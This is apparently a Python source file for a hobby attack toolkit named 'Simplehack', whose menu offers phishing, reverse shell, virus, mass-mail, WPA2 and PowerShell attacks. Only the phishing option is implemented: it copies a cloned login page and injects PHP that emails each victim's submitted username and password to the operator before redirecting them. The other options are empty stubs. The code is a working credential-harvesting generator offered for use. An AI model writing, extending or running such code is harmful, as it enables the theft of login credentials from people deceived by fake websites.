from pyfiglet import Figlet
import terminaltables
from shutil import copyfile
import shutil
import os



class website_attack():
    def __init__(self):
        path = "phishing/WebPages"

        my_list = os.listdir(path)

        a = 0
        b = 1
        c = 2
        d = 3

        x = 0

        liste = [["CHOOSE", " A WEBSITE", "FOR THE", "ATTACK"]]

        choose_liste = []

        zeilen = len(my_list) // 4

        e = 1
        f = zeilen + 1
        g = zeilen * 2 + 1
        h = zeilen * 3 + 1

        i = 0
        for file_names in range(len(my_list) // 4):
            choose_liste.append(my_list[i])
            i = i + 4

        i = 1
        for file_names in range(len(my_list) // 4):
            choose_liste.append(my_list[i])
            i = i + 4

        i = 2
        for file_names in range(len(my_list) // 4):
            choose_liste.append(my_list[i])
            i = i + 4

        i = 3
        for file_names in range(len(my_list) // 4):
            choose_liste.append(my_list[i])
            i = i + 4

        for z in range(zeilen):
            liste.append([str(e) + ") " + my_list[a], str(f) + ") " + my_list[b], str(g) + ") " + my_list[c],
                          str(h) + ") " + my_list[d]])
            a = a + 4
            b = b + 4
            c = c + 4
            d = d + 4

            e = e + 1
            f = f + 1
            g = g + 1
            h = h + 1

        table = terminaltables.AsciiTable(liste)

        print(table.table)

        # print(choose_liste)

        self.choosen_webside = choose_liste[int(input("Answer: ")) - 1]
        self.phishing_email = input("Please enter your email: ")
        self.storage_location = input("Please enter the storage location: ")
        self.redirect_location = input("Please enter the redirect location (for default type: d): ")


        self.generate_files(self.choosen_webside)

    def replace_string_in_file(self, filename, inputstring, outputstring):
        # Read in the file
        with open(filename, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace(inputstring, outputstring)

        # Write the file out again
        with open(filename, 'w') as file:
            file.write(filedata)

    def insert_line(self, filename, insert_pos, line):
        """
        Fügt der angegebenen Datei oberhalb der angegebenen Position die
        Zeile hinzu. Diese Funktion sollte nicht für große Dateien (50 MB)
        verwendet werden.
        """

        # Datei zum Lesen öffnen und alle Zeilen in eine Liste einlesen
        f = open(filename, "r")
        lines = f.readlines()
        f.close()

        # Wenn die Zeile nicht mit einem Zeilenumbruch endet, dann wird dieser
        # hinzugefügt.
        if not line.endswith("\n"):
            line += "\n"

        # Der Liste die neue Zeile hinzufügen
        lines.insert(insert_pos, line)

        # Speichern
        f = open(filename, "w")
        f.writelines(lines)
        f.close()


    def generate_files(self, website):
        path_to_copy = 'phishing/WebPages/' + website
        shutil.copytree(path_to_copy, self.storage_location)


        email_address = self.phishing_email
        header_location = self.redirect_location

        mail_to_string = '$mail_to = "' + email_address + '";'
        mail_message_string = "$msg = $_POST['username'] . '    ' . $_POST['password'];"
        mail_send_string = 'mail($mail_to,"Phishing",$msg) or die("unable to send email");'

        # print(mail_to_string)
        # print(mail_message_string)
        # print(mail_send_string)

        file_location = self.storage_location + "/login.php"

        self.insert_line(file_location, 3, mail_to_string)
        self.insert_line(file_location, 4, mail_message_string)
        self.insert_line(file_location, 5, mail_send_string)
        self.insert_line(file_location, 6, " ")

        self.replace_string_in_file(file_location, "<CUSTOM>", header_location)
        self.replace_string_in_file(file_location, "include 'ip.php';", "")







def reverse_attack():
    pass

def virus_attack():
    pass

def mail_attack():
    pass

def wlan_attack():
    pass

def powershell_attack():
    pass



def main_menu():
    os.system("color a")
    f = Figlet(font='slant')
    rend_text = f.renderText('Simplehack')
    print(rend_text)
    print("----------------- Created by Dante -----------------")
    print("")
    print("Please choose an option: ")
    print("")
    print("1) Website phishing attack")
    print("2) Reverse shell attack")
    print("3) Virus generator")
    print("4) Mass Mailer attacks")
    print("5) WLAN Attack (WPA2)")
    print("6) Powershell attack")
    print("")
    print("99) Exit")

    choose_attack = int(input())

    if choose_attack == 1:
        website_attack()
    elif choose_attack == 2:
        reverse_attack()
    elif choose_attack == 3:
        virus_attack()
    elif choose_attack == 4:
        mail_attack()
    elif choose_attack == 5:
        wlan_attack()
    elif choose_attack == 6:
        powershell_attack()
    elif choose_attack == 99:
        quit("Bye!")


main_menu()